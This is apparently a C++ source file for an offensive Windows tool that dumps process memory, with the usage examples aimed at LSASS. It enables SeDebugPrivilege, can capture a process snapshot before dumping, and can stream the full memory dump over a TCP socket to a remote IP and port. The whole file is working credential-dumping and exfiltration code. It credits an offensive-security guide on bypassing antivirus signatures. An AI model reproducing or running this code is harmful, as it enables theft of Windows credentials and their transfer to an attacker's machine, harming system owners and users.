/*
 * dumper.cpp
 *
 *  Created on: ???, 2024
 *      Author: juanga333
 * This is my own implementation to perform a memory dump with MiniDumpWriteDump with socket support.
 *  Big credits: https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass#minidumpwritedump-to-memory-using-minidump-callbacks
 * And obviously thanks to windows for having their API documented so well to break their things
 * Examples:
 * procdump.exe --pid 1004 --dmp lsass.dmp --elevate
 * procdump.exe --pid 1004 --dmp lsass.dmp --elevate --snapshot
 * procdump.exe --pid 1004 --ip 192.168.0.105 --port 443 --elevate
 * procdump.exe --name lsass.exe --dmp lsass.dmp --elevate
 * 
*/

#include "argparse.h"

#include <winsock2.h>
#include <windows.h>
#include <DbgHelp.h>
#include <stdio.h>
#include <ws2tcpip.h>
#include <iostream>
#include <psapi.h>
#include <tchar.h>
#include <vector>
#include <processsnapshot.h>

#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Kernel32.lib")

// Estructura de ayuda para pasar al callback
struct CallbackHelper {
    LPVOID dumpBuffer; // Buffer para almacenar el volcado
    DWORD bytesRead;   // Cantidad de bytes leídos en el buffer
};

// Buffer para guardar el volcado
LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75); // Ajusta el tamaño según sea necesario
DWORD bytesRead = 0;

BOOL CALLBACK minidumpCallbackSocket(
    PVOID CallbackParam,
    const PMINIDUMP_CALLBACK_INPUT CallbackInput, // Asegúrate de que la variable se llama CallbackInput
    PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
) {
    CallbackHelper* helper = (CallbackHelper*)CallbackParam;

    switch (CallbackInput->CallbackType) { // Usa correctamente CallbackInput aquí
    case IoStartCallback:
        CallbackOutput->Status = S_FALSE;
        break;

    case IoWriteAllCallback: {
        CallbackOutput->Status = S_OK;
        // Asegúrate de usar CallbackInput, que es el nombre correcto del parámetro.
        LPVOID destination = (LPBYTE)helper->dumpBuffer + CallbackInput->Io.Offset;
        // manejo de errores
        RtlCopyMemory(destination, CallbackInput->Io.Buffer, CallbackInput->Io.BufferBytes);
        DWORD newBytesRead = CallbackInput->Io.Offset + CallbackInput->Io.BufferBytes;
        if (newBytesRead > helper->bytesRead) {
            helper->bytesRead = newBytesRead;
        }
        break;
    }

    case IoFinishCallback:
        CallbackOutput->Status = S_OK;
        break;

    }


    return TRUE;
}

BOOL CALLBACK minidumpCallbackSnap(
    PVOID CallbackParam,
    const PMINIDUMP_CALLBACK_INPUT CallbackInput, // Asegúrate de que la variable se llama CallbackInput
    PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
) {
    CallbackHelper* helper = (CallbackHelper*)CallbackParam;

    switch (CallbackInput->CallbackType) { // Usa correctamente CallbackInput aquí
    case IsProcessSnapshotCallback:
        // Informar a MiniDumpWriteDump que es una snapshot de proceso.
        CallbackOutput->Status = S_FALSE;
        break;
    }


    return TRUE;
}

// Función para enviar el buffer a través de un socket
BOOL SendDumpOverSocket(SOCKET socket, LPVOID buffer, DWORD bufferSize) {
    int iResult = send(socket, (const char*)buffer, bufferSize, 0);
    if (iResult == SOCKET_ERROR) {
        printf("Socket send() failed with error: %d\n", WSAGetLastError());
        closesocket(socket);
        WSACleanup();
        return FALSE;
    }
    printf("Bytes Sent: %ld\n", iResult);
    return TRUE;
}

SOCKET createSocket(const char* ipAddress, const char* port) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct sockaddr_in clientService;
    int result;

    // Inicializar Winsock
    result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        return INVALID_SOCKET;
    }

    // Crear un socket
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        printf("Error at socket(): %ld\n", WSAGetLastError());
        WSACleanup();
        return INVALID_SOCKET;
    }

    // Configurar la dirección del servidor
    clientService.sin_family = AF_INET;
    clientService.sin_port = htons(static_cast<u_short>(atoi(port))); // Convertir el puerto de cadena a entero

    // Usar InetPtonA para soportar la cadena de dirección IP ANSI
    if (InetPtonA(AF_INET, ipAddress, &clientService.sin_addr) <= 0) {
        printf("Invalid address/ Address not supported \n");
        closesocket(ConnectSocket);
        WSACleanup();
        return INVALID_SOCKET;
    }

    // Conectar al servidor
    result = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
    if (result == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        printf("Unable to connect to server :(\n");
        WSACleanup();
        return INVALID_SOCKET;
    }

    return ConnectSocket;
}


BOOL createMiniDumpSocket(DWORD processId, const char* ipAddress, const char* port) {
    // Primero de todo, hay que obtener un puntero al proceso que queremos volcar
    HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (!processHandle) {
        fprintf(stderr, "[!]OpenProcess(): Problema al obtener el handle al proceso. Tienes capacidad de SeDebugPrivilege? Codigo de error: %lu\n", GetLastError());
        return FALSE;
    }

    CallbackHelper helper = { dumpBuffer, 0 };
    MINIDUMP_CALLBACK_INFORMATION callbackInfo = { 0 };
    callbackInfo.CallbackRoutine = minidumpCallbackSocket;
    callbackInfo.CallbackParam = &helper;

    BOOL result = MiniDumpWriteDump(processHandle, processId, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
    if (!result) {
        fprintf(stderr, "MiniDumpWriteDump() failed with error %lu\n", GetLastError());
    }
    else {
        printf("Dumped %lu bytes\n", helper.bytesRead);
        // Aquí conectas al servidor y envías el dump
        SOCKET serverSocket = createSocket(ipAddress, port);
        SendDumpOverSocket(serverSocket, helper.dumpBuffer, helper.bytesRead);
        // No olvides cerrar el socket y realizar la limpieza necesaria
        closesocket(serverSocket);
        WSACleanup();
    }

    CloseHandle(processHandle);
    return result;
}


BOOL createMiniDumpWrite(DWORD processId, const std::string& dumpFilePath, bool snap) {
    CallbackHelper helper = { dumpBuffer, 0 };
    MINIDUMP_CALLBACK_INFORMATION callbackInfo = { 0 };

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!processHandle) {
        fprintf(stderr, "[!]OpenProcess(): Problema al obtener el handle al proceso. Codigo de error: %lu\n", GetLastError());
        return FALSE;
    }

    HANDLE snapshotHandle = NULL;
    if (snap) {
        DWORD flags = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
        DWORD status = PssCaptureSnapshot(processHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&snapshotHandle);
        if (status != ERROR_SUCCESS) { // Aquí comprobamos que status NO sea ERROR_SUCCESS para imprimir error.
            fprintf(stderr, "[!]PssCaptureSnapshot(): Error al capturar snapshot. Codigo de error: %lu\n", status);
            CloseHandle(processHandle);
            return FALSE;
        } 
        processHandle = snapshotHandle;
        callbackInfo.CallbackRoutine = minidumpCallbackSnap;
        callbackInfo.CallbackParam = &helper;
    }

    // Lo siguiente es crear un archivo en disco, que usaremos despues para el volcado
    HANDLE dumpFileHandle = CreateFileA(dumpFilePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (dumpFileHandle == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!]CreateFileA(): Problema al obtener el handle. Tienes permisos de lectura en el lugar de volcado? El PID proporcionado existe? Codigo de error: %lu\n", GetLastError());
        CloseHandle(processHandle);
        return FALSE;
    }

    // Ya tenemos un archivo en disco, ahora vamos a rellenarlo con el contenido del puntero que hemos obtenido
    BOOL result = MiniDumpWriteDump(processHandle, processId, dumpFileHandle, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
    if (!result) {
        fprintf(stderr, "[!]MiniDumpWriteDump() Fallo al llamar a la funcion. Codigo de error: %lu\n", GetLastError());
    }

    // Cerramos ambos handles (liberamos punteros :D)
    CloseHandle(dumpFileHandle);
    CloseHandle(processHandle);

    return result;
}


BOOL setPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege) {
    TOKEN_PRIVILEGES tokenPriv;
    LUID luid;

    // Intentamos obtener el LUID
    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        fprintf(stderr, "[!]LookupPrivilegeValue(): error: %lu\n", GetLastError());
        return FALSE;
    }

    // Seteamos los valores a la estructura TOKEN_PRIVIELGES
    tokenPriv.PrivilegeCount = 1;
    tokenPriv.Privileges[0].Luid = luid;
    tokenPriv.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

    // Le pasamos la nueva estrucutra tokenPriv con SeDebugPrivilege habilitado para que nos modifique el token del proceso
    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        fprintf(stderr, "[!]AdjustTokenPrivileges: error: %lu\n", GetLastError());
        return FALSE;
    }

    // Que AdjustTokenPrivilege haya finalizado sin errores no quiere decir que se haya seteado el privielgio
    // Si cumple esta condicion, lo más seguro es que se esté ejecutando desde un usuario que no tiene la capacidad de obtener ese priv
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("The token does not have SeDebugPrivielge. Maybe you're not admin? \n");
        return FALSE;
    }

    return TRUE;
}


 std::string getProcessNameByPID(DWORD processID) {
     char processName[MAX_PATH] = "<unknown>"; // Buffer para almacenar el nombre del proceso

    // Abre un handle al proceso.
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
    if (!hProcess) {
        fprintf(stderr, "[!]OpenProcess(): Problema al obtener el handle al proceso. %lu\n", GetLastError());
        return FALSE;
    }
    else{
        HMODULE hMod;
        DWORD cbNeeded;
        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
            GetModuleBaseNameA(hProcess, hMod, processName, sizeof(processName) / sizeof(char));
        }
    }
    CloseHandle(hProcess);

    return std::string(processName);
 }


DWORD getProcessId(const std::string& processName) {
    DWORD processIds[1024], processCount, processId = 0;
    if (!EnumProcesses(processIds, sizeof(processIds), &processCount)) {
        return 0; // No se pudieron enumerar los procesos
    }

    processCount /= sizeof(DWORD);

    for (DWORD i = 0; i < processCount; i++) {
        if (processIds[i] != 0) {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIds[i]);
            if (hProcess) { // Verifica que OpenProcess haya tenido éxito
                char processNameBuffer[MAX_PATH];
                if (GetModuleBaseNameA(hProcess, NULL, processNameBuffer, sizeof(processNameBuffer) / sizeof(char)) > 0) {
                    if (processName == processNameBuffer) { // Compara los nombres
                        processId = processIds[i]; // Encontrado
                        CloseHandle(hProcess);
                        break;
                    }
                }
                CloseHandle(hProcess);
            }
        }
    }

    return processId;
}

int main(int argc, char* argv[]) {
    argparse::ArgumentParser program("program_name");

    program.add_argument("--pid").help("Process ID to dump.").scan<'i', int>().default_value(0);
    program.add_argument("--procname").help("Name of the process.").default_value("");
    program.add_argument("--dmp").help("File name to dump the process.").default_value("");
    program.add_argument("--ip").help("IP address to send de dump.").default_value("");
    program.add_argument("--port").help("Port to send de dump.").default_value("");
    program.add_argument("--elevate").help("Set SeDebugPrivilege.[OPTIONAL]").default_value(false).implicit_value(true);
    program.add_argument("--snapshot").help("Creates a snapshot of the process before dumping it.[OPTIONAL, not compatible with sockets]").default_value(false).implicit_value(true);


    try {
        program.parse_args(argc, argv);
    }
    catch (const std::exception& err) {
        std::cerr << err.what() << std::endl;
        std::cerr << program;
        return 1;
    }

    try {
        int pid = program.get<int>("--pid");
        std::string procname = program.get<std::string>("--procname");
        std::string dmp = program.get<std::string>("--dmp");
        std::string ip = program.get<std::string>("--ip");
        std::string port = program.get<std::string>("--port");
        bool snap = program.get<bool>("--snapshot");

        HANDLE hToken;
        if (program["--elevate"] == true) {
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
                // En caso de que hayamos podido obtener un handle del token de nuestro proceso
                // Intentamos habilitar el privilegio SeDebugPrivilege
                if (setPrivilege(hToken, SE_DEBUG_NAME)) {
                    printf("SeDebugPrivilege enabled successfully\n");
                }
                else {
                    printf("Failed to enable SeDebugPrivilege\n");
                }
                CloseHandle(hToken);
            }
            else {
                fprintf(stderr, "[!]OpenProcessToken: failed with error %lu\n", GetLastError());
            }
        }

        // Es obligatorio que se especifique o el PID o el nombre del proceso
        if (pid > 0 && procname.empty()) {
            procname = getProcessNameByPID(pid);
        }
        else if (!procname.empty() && pid <= 0) {
            pid = getProcessId(procname);
        }
        else {
            fprintf(stderr, "You need to specify the program name OR pid (PID>1)\n");
            std::cout << program;
            return 1;
        }

        if (dmp.empty()) {
            if (ip.empty()) {
                if(port.empty())
                    printf("It is necessary to specify the file name of the dump, or the IP and port to which it is sent\n");
                else
                    printf("The port must be specified together with the IP address\n");
            }
            else {
                if (port.empty())
                    printf("You need to specify the port\n");
                else
                    createMiniDumpSocket(pid, ip.c_str(), port.c_str());
            }
        }
        else {
            if (ip.empty()) {
                if (port.empty())
                    createMiniDumpWrite(pid, dmp, snap);
                else
                    printf("You can't specify the file name of the dump and the port\n");
            }
            else
                if(port.empty())
                    printf("You can't specify the file name of the dump and the IP\n");
                else
                    printf("It is necessary to specify only the file name of the dump, or the IP and port to which it is sent\n");
        }
    }
    catch (const std::exception& err) {
        std::cerr << err.what() << std::endl;
        std::cerr << program;
        return 1;
    }

    return 0;
}
